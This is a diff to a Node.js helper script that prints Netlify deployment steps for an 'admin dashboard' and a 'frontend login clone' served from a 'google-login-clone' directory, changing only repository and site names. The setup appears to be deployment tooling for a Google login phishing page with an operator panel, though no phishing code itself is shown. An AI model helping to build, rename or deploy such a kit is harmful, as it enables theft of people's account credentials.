@@ -2,14 +2,14 @@ const { exec } = require('child_process');
 
 console.log('🚀 NETLIFY AUTO-DEPLOY READY!');
 console.log('=====================================');
-console.log('✅ Code pushed to GitHub: https://github.com/tigerads1998/ggclone');
+console.log('✅ Code pushed to GitHub: https://github.com/tigerads1998/googlenew1');
 console.log('✅ Netlify configs created');
 console.log('✅ Ready for deployment!');
 console.log('');
 
 // URLs for deployment
-const adminDeployURL = 'https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/ggclone';
-const frontendDeployURL = 'https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/ggclone';
+const adminDeployURL = 'https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/googlenew1';
+const frontendDeployURL = 'https://app.netlify.com/start/deploy?repository=https://github.com/tigerads1998/googlenew1';
 
 console.log('🔥 DEPLOY INSTRUCTIONS:');
 console.log('=====================================');
@@ -17,22 +17,22 @@ console.log('');
 console.log('📊 ADMIN DASHBOARD:');
 console.log('1. Click: ' + adminDeployURL);
 console.log('2. Configure:');
-console.log('   - Site name: ggclone-admin-dashboard');
+console.log('   - Site name: googlenew1-admin-dashboard');
 console.log('   - Publish directory: admin-gui');
 console.log('   - Build command: (leave empty)');
 console.log('');
 console.log('🔐 FRONTEND LOGIN CLONE:');
 console.log('1. Click: ' + frontendDeployURL);
 console.log('2. Configure:');
-console.log('   - Site name: ggclone-frontend');
-console.log('   - Publish directory: google-login-clone');
+console.log('   - Site name: googlenew1-frontend');
+console.log('   - Publish directory: google-clone-new');
 console.log('   - Build command: (leave empty)');
 console.log('');
 
 console.log('🌐 EXPECTED LIVE URLS:');
 console.log('=====================================');
-console.log('📊 Admin Dashboard: https://ggclone-admin-dashboard.netlify.app');
-console.log('🔐 Frontend Clone: https://ggclone-frontend.netlify.app');
+console.log('📊 Admin Dashboard: https://googlenew1-admin-dashboard.netlify.app');
+console.log('🔐 Frontend Clone: https://googlenew1-frontend.netlify.app');
 console.log('');
 
 console.log('🚀 OPENING DEPLOYMENT PAGES...');
